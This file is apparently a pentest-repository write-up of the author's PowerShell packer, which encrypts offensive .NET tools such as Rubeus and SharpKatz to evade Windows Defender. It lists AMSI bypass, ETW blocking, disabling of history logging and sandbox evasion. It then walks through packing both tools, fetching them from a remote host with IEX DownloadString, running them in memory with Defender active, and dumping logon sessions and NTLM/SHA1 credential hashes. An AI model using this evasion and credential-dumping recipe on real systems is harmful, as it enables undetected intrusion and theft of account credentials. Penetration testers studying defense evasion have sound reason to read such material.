@@ -1,0 +1,179 @@
+=====================================================================================================================================
+AV bypass using my PowerShell packer 'Invoke-PoSH-CsharpPacker'
+=====================================================================================================================================
+
+'Invoke-PoSH-CsharpPacker' allows to pack and encrypt offensive (C#) .NET executable files in order to bypass AV solutions such as Windows Defender. 
+It generates an obfuscated and encrypted PowerShell script that contains the (C#) .NET executable file.
+
+=> https://github.com/Jean-Francois-C/Windows-Penetration-Testing/tree/master/Defense%20evasion%20(examples)/Invoke-PoSH-CsharpPacker
+
+FEATURES
+--------
+> AES encryption and GZip/Deflate compression (based on 'Xencrypt')
+> AMSI bypass
+> Blocking Event Tracing for Windows (ETW)
+> Disabling PowerShell history logging
+> Basic sandbox evasion techniques (optional)
+  + stop/exit if the PowerShell session is being debugged (detection based on "Test-Path Variable:PSDebugContext")
+  + wait for 60 seconds before execution
+
+
+=====================================================================================================================================
+Examples - Run a packed/encrypted version of Rubeus and SharpKatz on a Windows 10 laptop without being detected by Windows Defender
+=====================================================================================================================================
+
+Step 1 - Create a packed/encrypted version of Rubeus and SharpKatz using 'Invoke-PoSH-CsharpPacker.ps1'
+--------------------------------------------------------------------------------------------------------
+
+PS C:\Users\Administrator\Documents\Tools-Pentest\1-Antivirus-bypass\PoSH-Packer> Import-Module ./Invoke-PoSH-CsharpPacker.ps1
+
+   ___    _                     ___         _
+  / __|__| |_  ___ _ _ _ __ ___| _ \___  __| |_____ _ _
+ | (__(_-< ' \/ _ | '_| '_ \___|  _/ _ |/ _| / / -_) '_|
+  \___/__/_||_\__,|_| | .__/   |_| \__,_\__|_\_\___|_|
+                      |_|                               v2.0
+
+Usage:
+> Import-Module ./Invoke-PoSH-CsharpPacker.ps1
+> Invoke-PoSH-CsharpPacker-FileUrl https://URL/Csharp-binary.exe -OutFile C:\path\Packed-Csharp-binary.ps1
+> Invoke-PoSH-CsharpPacker-FilePath C:\path\Csharp-binary.exe -OutFile C:\path\Packed-Csharp-binary.ps1
+
+Features:
+[*] AES encryption and GZip/Deflate compression (based on 'Xencrypt')
+[*] AMSI bypass
+[*] Blocking Event Tracing for Windows (ETW)
+[*] Disabling PowerShell history logging
+[*] Basic sandbox evasion techniques (optional -sandbox)
+
+
+PS C:\Users\Administrator\Documents\Tools-Pentest\1-Antivirus-bypass\PoSH-Packer> Invoke-PoSH-CsharpPacker-FileUrl https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe 
+-OutFile C:\Users\Administrator\Documents\Tools-Pentest\1-Antivirus-bypass\packed-katz.ps1
+[*] Downloading the remote .NET executable file: 'https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe'
+[*] Creating the .NET executable loader script
+[*] File compression (GZip/Deflate)
+[*] File encryption (AES)
+[*] Adding 'A'M'S'I' bypass
+[*] Adding 'E'T'W' bypass
+[*] Disabling PoSh history logging
+[*] The obfuscated & encrypted .NET executable loader script has been saved: 'C:\Users\Administrator\Documents\Tools-Pentest\1-Antivirus-bypass\packed-katz.ps1' ...
+[+] Done!
+
+
+PS C:\Users\Administrator\Documents\Tools-Pentest\1-Antivirus-bypass\PoSH-Packer> Invoke-PoSH-CsharpPacker-FileUrl https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/Rubeus.exe 
+-OutFile C:\Users\Administrator\Documents\Tools-Pentest\1-Antivirus-bypass\packed-rubeus.ps1
+[*] Downloading the remote .NET executable file: 'https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/Rubeus.exe'
+[*] Creating the .NET executable loader script
+[*] File compression (GZip/Deflate)
+[*] File encryption (AES)
+[*] Adding 'A'M'S'I' bypass
+[*] Adding 'E'T'W' bypass
+[*] Disabling PoSh history logging
+[*] The obfuscated & encrypted .NET executable loader script has been saved: 'C:\Users\Administrator\Documents\Tools-Pentest\1-Antivirus-bypass\packed-rubeus.ps1' ...
+[+] Done!
+
+
+Step 2 - Download & execute into memory the packed/encrypted version of Rubeus and SharpKatz without being detected by the Windows Defender AV
+-----------------------------------------------------------------------------------------------------------------------------------------------
+
+PS C:\Users\Administrator\Desktop> systeminfo
+Host Name:                 Laptop1
+OS Name:                   Microsoft Windows 10 Pro
+OS Version:                10.0.19044 N/A Build 19044
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Member Workstation
+OS Build Type:             Multiprocessor Free
+<SNIP>
+
+PS C:\Users\Administrator\Desktop> Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled,AntivirusSignatureLastUpdated | FL
+AntivirusEnabled              : True
+RealTimeProtectionEnabled     : True
+IoavProtectionEnabled         : True
+AntispywareEnabled            : True
+AntivirusSignatureLastUpdated : 09/02/2023 05:51:18
+
+
+PS C:\Users\Administrator\Desktop> IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.113:8081/packed-rubeus.ps1');
+PS C:\Users\Administrator\Desktop> Invoke-Packed-NET-Executable logonsession /current
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.2
+
+[*] Action: Display all logon session information
+
+    LUID          : 0x12e3084f (316868687)
+    UserName      : Administrator
+    LogonDomain   : Laptop1
+    SID           : S-1-5-21-936125016-2310263949-2175806047-500
+    AuthPackage   : NTLM
+    LogonType     : Interactive (2)
+    Session       : 8
+    LogonTime     : 08/02/2023 20:52:52
+    LogonServer   : Laptop1
+    DnsDomainName :
+    Upn           :
+
+    LUID          : 0x12dc17b2 (316413874)
+    UserName      : DWM-8
+    LogonDomain   : Window Manager
+    SID           : S-1-5-90-0-8
+    AuthPackage   : Negotiate
+    LogonType     : Interactive (2)
+    Session       : 8
+    LogonTime     : 08/02/2023 19:42:01
+    LogonServer   :
+    DnsDomainName :
+    Upn           :
+	
+<SNIP>
+
+
+PS C:\Users\Administrator\Desktop> IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.113:8081/packed-katz.ps1');
+PS C:\Users\Administrator\Desktop> Invoke-Packed-NET-Executable --Commands logonpasswords
+[*]
+[*]                     System Information
+[*] ----------------------------------------------------------------------
+[*] | Platform: Win32NT                                                  |
+[*] ----------------------------------------------------------------------
+[*] | Major: 10            | Minor: 0             | Build: 19044         |
+[*] ----------------------------------------------------------------------
+[*] | Version: Microsoft Windows NT 10.0.19044.0                         |
+[*] ----------------------------------------------------------------------
+[*]
+[*] Authentication Id   : 0;316868687 (00000000:316868687)
+[*] Session             : Interactive from 8
+[*] UserName            : Administrator
+[*] LogonDomain         : Laptop1
+[*] LogonServer         : Laptop1
+[*] LogonTime           : 2023/02/08 20:52:52
+[*] SID                 : S-1-5-21-936125016-2310263949-2175806047-500
+[*]
+[*]      Msv
+[*]       Domain   : Laptop1
+[*]       Username : Administrator
+[*]       LM       : 00000000000000000000000000000000
+[*]       NTLM     : 36f7a3ebaa54935ecf03678e118<SNIP>
+[*]       SHA1     : d5feabcececab0e16c2cbb39178<SNIP>
+[*]       DPAPI    : 00000000000000000000000000000000
+[*]
+[*]      Tspkg
+[*]       Domain   : Laptop1
+[*]       Username : Administrator
+[*]       Password : <SNIP>
+[*]
+[*]      WDigest
+[*]       Hostname : Laptop1
+[*]       Username : Administrator
+[*]       Password : [NULL]
+[*]
+[*]      Kerberos
+[*]       Domain   : Laptop1
+[*]       Username : Administrator
+[*]       Password : [NULL]
+
+<SNIP>
